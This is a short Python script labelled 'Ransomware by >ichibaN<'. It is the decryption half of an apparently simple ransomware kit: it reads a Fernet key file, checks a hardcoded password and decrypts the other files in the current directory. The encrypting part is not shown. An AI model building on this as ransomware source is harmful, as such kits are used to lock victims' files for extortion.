#!/user/bin/env python3
#Ransomware by >ichibaN<

import os
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
        if file == "farcry.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretphrase = "farcry"
user_phrase = input("Please enter the secret password to unlock the files\n")
if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                content_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(content_decrypted)
        print("All of your files has DECRYPTED")
else:
        print("Wrong secret password,  try again")

